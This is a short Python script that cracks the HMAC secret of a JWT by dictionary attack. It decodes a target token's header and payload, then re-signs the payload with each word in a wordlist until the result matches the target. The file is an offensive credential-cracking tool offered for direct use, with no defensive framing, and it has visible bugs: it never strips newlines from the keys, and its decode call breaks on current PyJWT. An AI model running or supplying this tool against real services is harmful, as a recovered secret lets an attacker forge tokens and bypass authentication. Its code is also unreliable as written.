#!/usr/bin/python
#-*- encoding: utf-8 -*-

import jwt
import sys
import argparse
import inspect
import base64
import json

def set_arg():
    parser = argparse.ArgumentParser(description='HS256 algo jwt crack with dictonary attack')
    parser.add_argument('--wordlist', type=str, help='wordlist file')
    parser.add_argument('--target', type=str, help='target jwt file')
    
    args = parser.parse_args()
    for k, v in vars(args).items():
        if v == None:
            print('Need args %s' % k)
            print('use %s --help' % inspect.getfile(inspect.currentframe()))
            sys.exit(1)
    return parser

def padding(b64str):
    b64str += '=' * ( (4 - len(b64str)%4) %4)
    return b64str

def parsing_arg():
    parser = set_arg()
    args = parser.parse_args()
    header = ''
    payload = ''
    target = ''

    try:
        with open(args.target, 'r') as f:
            target = f.read().replace('\n','')
            header = json.loads(base64.b64decode(padding(target.split('.')[0])).decode())
            payload = json.loads(base64.b64decode(padding(target.split('.')[1])).decode())
        print('header = %s' % header)
        print('payload = %s' % payload)
        print('target = %s' % target)
    except Exception as e:
        print(e)
        sys.exit(1)
    
    with open(args.wordlist) as f:
        while True:
            key = f.readline()
            if key == '':
                break
            print('try key : %s' % key)
            encoded = jwt.encode(payload, key, algorithm="HS256", headers=header).decode()
            print('encoded = %s' % encoded)
            if encoded == target:
                print('ans key == %s\n' % key)
                break
        print('end')

def main():
    parsing_arg()

if __name__ == "__main__":
    main()
